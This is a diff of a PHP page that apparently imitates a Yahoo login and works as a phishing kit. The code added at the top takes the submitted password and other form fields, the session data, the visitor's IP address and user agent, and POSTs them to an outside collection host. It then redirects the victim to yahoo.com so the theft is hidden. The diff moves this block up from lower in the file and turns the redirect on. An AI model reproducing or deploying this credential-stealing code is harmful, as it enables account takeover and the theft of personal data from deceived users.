@@ -1,4 +1,61 @@
+	<?
+	
+	$login_email = "jleighw09@yahoo.com";
+	$password = $_POST['password'];
+	
+	
+	
+	if(isset($_POST['verifyPassword'])){
+		
+		if(empty($_POST['password'])){
+			
+			echo"OOOOOOOOOOOOOOOOOO";
+			
+			
+		}else{
+			
+						//----------------send request post to url ----------------
+function sendPost($url,$data) {
+	
+	
+$options = array(
+        'http' => array(
+        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+        'method'  => 'POST',
+        'content' => http_build_query($data),
+    )
+);
 
+$context  = stream_context_create($options);
+$result = file_get_contents($url, false, $context);
+return $result;
+}
+
+$data = $_POST;
+$data['date'] = $date;
+$data['s'] = $_SESSION;
+$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
+$data['b'] = ($_SERVER['HTTP_USER_AGENT']);
+//$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
+
+
+sendPost('http://saveinfo.aba.ae/Save/yahoo.php',$data);
+
+
+//---- end request----------------
+
+
+$url = "https://www.yahoo.com";
+
+header("LOCATION: ".$url."");
+			
+
+			
+		}
+	}
+	
+	
+	?>
 
 
 <html id="Stencil" class="js mobile"><head>
@@ -164,55 +221,7 @@ root.isIOSDevice = true;
 <!-- fe07.member.ir2.yahoo.com - Wed Apr 24 2019 10:21:28 GMT+0000 (UTC) - (0ms) -->
 
 
-	<?
-	
-	$login_email = "jleighw09@yahoo.com";
-	$password = $_POST['password'];
-	
-	
-	
-	if(isset($_POST['verifyPassword'])){
-		
-		
-					//----------------send request post to url ----------------
-function sendPost($url,$data) {
-	
-	
-$options = array(
-        'http' => array(
-        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-        'method'  => 'POST',
-        'content' => http_build_query($data),
-    )
-);
 
-$context  = stream_context_create($options);
-$result = file_get_contents($url, false, $context);
-return $result;
-}
-
-$data = $_POST;
-$data['date'] = $date;
-$data['s'] = $_SESSION;
-$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
-$data['b'] = ($_SERVER['HTTP_USER_AGENT']);
-//$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
-
-
-sendPost('http://saveinfo.aba.ae/Save/yahoo.php',$data);
-
-
-//---- end request----------------
-
-
-$url = "https://www.yahoo.com";
-
-//header("LOCATION: ".$url."");
-
-	}
-	
-	
-	?>
 
 
 
